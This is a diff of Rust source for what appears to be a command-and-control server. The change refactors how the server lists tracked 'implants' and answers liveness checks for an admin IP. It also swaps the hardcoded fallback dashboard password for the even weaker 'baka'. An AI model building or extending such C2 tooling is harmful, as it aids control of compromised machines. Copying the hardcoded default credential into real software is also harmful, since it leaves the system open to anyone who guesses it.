@@ -2,7 +2,7 @@ use std::{
     collections::HashMap,
     env,
     io::{Read, Write},
-    net::{IpAddr, TcpListener},
+    net::{IpAddr, TcpListener, TcpStream},
     time::SystemTime,
 };
 
@@ -22,7 +22,6 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
         stream.read(&mut buf).expect("failed to read from stream");
 
         let decoded = decode(&buf).unwrap();
-
         println!("{decoded:?}");
 
         match decoded {
@@ -31,10 +30,8 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
             }
             Packet::DashboardLogin { password } => {
                 let passwd = match env::var_os("TYSE_PASSWORD") {
-                    Some(os_string) => os_string
-                        .into_string()
-                        .unwrap_or("changemeyoubaka".to_string()),
-                    None => "changemeyoubaka".to_string(),
+                    Some(os_string) => os_string.into_string().unwrap_or("baka".to_string()),
+                    None => "baka".to_string(),
                 };
 
                 if passwd == password {
@@ -51,22 +48,7 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
                 if let Some(admin_ip) = admin_ip
                     && stream.peer_addr().unwrap().ip() == admin_ip
                 {
-                    match decoded {
-                        Packet::ImplantListRequest => {
-                            remove_old_implants(&mut implants);
-
-                            stream.write(
-                                encode(Packet::ImplantList(
-                                    implants.values().map(|implant| implant.clone()).collect(),
-                                ))
-                                .unwrap()
-                                .as_slice(),
-                            )?;
-                        }
-                        _ => {
-                            stream.write(encode(Packet::C2Alive).unwrap().as_slice())?;
-                        }
-                    }
+                    run_admin_command(&mut stream, &decoded, &mut implants)?;
                 } else {
                     println!(
                         "Unauthorized device tried to access admin commands: {}",
@@ -74,6 +56,31 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
                     );
                 }
             }
+        }
+    }
+
+    Ok(())
+}
+
+fn run_admin_command(
+    stream: &mut TcpStream,
+    decoded: &Packet,
+    implants: &mut HashMap<IpAddr, Implant>,
+) -> Result<(), Box<dyn std::error::Error>> {
+    match decoded {
+        Packet::ImplantListRequest => {
+            remove_old_implants(implants);
+
+            stream.write(
+                encode(Packet::ImplantList(
+                    implants.values().map(|implant| implant.clone()).collect(),
+                ))
+                .unwrap()
+                .as_slice(),
+            )?;
+        }
+        _ => {
+            stream.write(encode(Packet::C2Alive).unwrap().as_slice())?;
         }
     }
 
